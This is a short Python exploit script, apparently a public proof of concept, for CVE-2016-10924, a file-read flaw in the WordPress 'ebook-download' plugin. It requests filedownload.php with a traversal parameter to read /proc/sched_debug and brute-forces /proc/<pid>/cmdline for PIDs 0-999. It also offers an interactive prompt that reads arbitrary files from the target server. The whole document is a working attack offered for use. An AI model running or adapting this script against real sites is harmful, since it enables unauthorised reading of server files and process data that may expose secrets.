#!/usr/bin/python3

import sys
import requests

# Title  : PID-brute - CVE-2016-10924 
# Author : Ravindu Wickramasinghe (@rvizx9)

print('''

+===================================+
|                                   |
|   CVE-2016-10924 PID Bruteforce   |
|             @rvizx9               |
|                                   |
+===================================+

''')

try:
	url=sys.argv[1]
except:
	print("usage : pid-brute.py <url>\n")
	exit()

def req(pf):
	li=(len(pf)+1)*3
	try:
		response = requests.get(url+'/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/'+pf)
		out=(response.text)[li:][:-31]
		if out!='':
			print(pf+'  :   '+out)
	except:
		print("[!] Incorrect URL or It's not vulnerable")

def main():
	req('proc/sched_debug')
	op=input("[Q] Read files manually ? (y/N) : ")
	print("\n\n")
	if op=='y' or op=='Y':
		while True:
			cmd=input("file > ")
			req(cmd)
	else:	
		for i in range(0,1000): #change pid limit 
			req('proc/'+str(i)+'/'+'cmdline')
main()
